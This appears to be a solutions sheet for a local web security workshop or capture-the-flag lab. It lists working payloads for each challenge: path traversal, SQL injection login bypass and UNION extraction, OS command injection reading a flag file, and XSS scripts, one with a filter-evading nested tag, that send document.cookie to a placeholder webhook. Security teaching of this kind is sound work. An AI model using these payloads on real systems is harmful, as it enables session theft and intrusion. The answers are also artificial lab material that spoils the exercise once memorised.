# Web Security Workshop solutions

## LFI: exporting data on inspector gadget

Visit http://localhost:3001/?loc=..%2f..%2fdocument%2finsp3ct0r_g4dg3t_456afbc.ht.htmlml

## SQLi: basic

Username: admin'; --
Password: anything

## SQLI: Worker's Union

Query: `' UNION SELECT flag, null FROM flags;--`

## XSS: Reflection

```html
<script>
  document.location.href = "<Your webhook site>?c=" + document.cookie;
</script>
```

# OS Command injection: basic

To list the folder
`; ls #!`

To read the flag file
`; cat flag.txt #!`

## XSS: Getting the staff cookies

```html
<script>
  document.location.href = "<Your webhook site>?c=" + document.cookie;
</script>
```

## XSS: Getting the admin

```html
<scr<script>ipt>
document.location.href= "<Your webhook site>?c=" + document.cookie;
</scr</script>ipt>
```
